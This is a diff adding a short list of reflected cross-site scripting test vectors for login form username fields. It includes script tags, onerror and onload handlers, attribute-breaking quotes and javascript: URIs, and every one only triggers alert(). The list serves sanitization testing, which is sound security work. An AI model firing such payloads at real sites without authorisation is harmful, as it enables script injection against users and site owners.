@@ -1,0 +1,14 @@
+# Cross-Site Scripting (XSS) Vectors for Login Forms
+# Usage: Test on Username field (Reflected XSS)
+# Purpose: Check if input is sanitized properly
+
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+' onmouseover=alert(1)
+" onmouseover=alert(1)
+<svg/onload=alert(1)>
+javascript:alert(1)
+"><body onload=alert(1)>
+<iframe src="javascript:alert(1)">
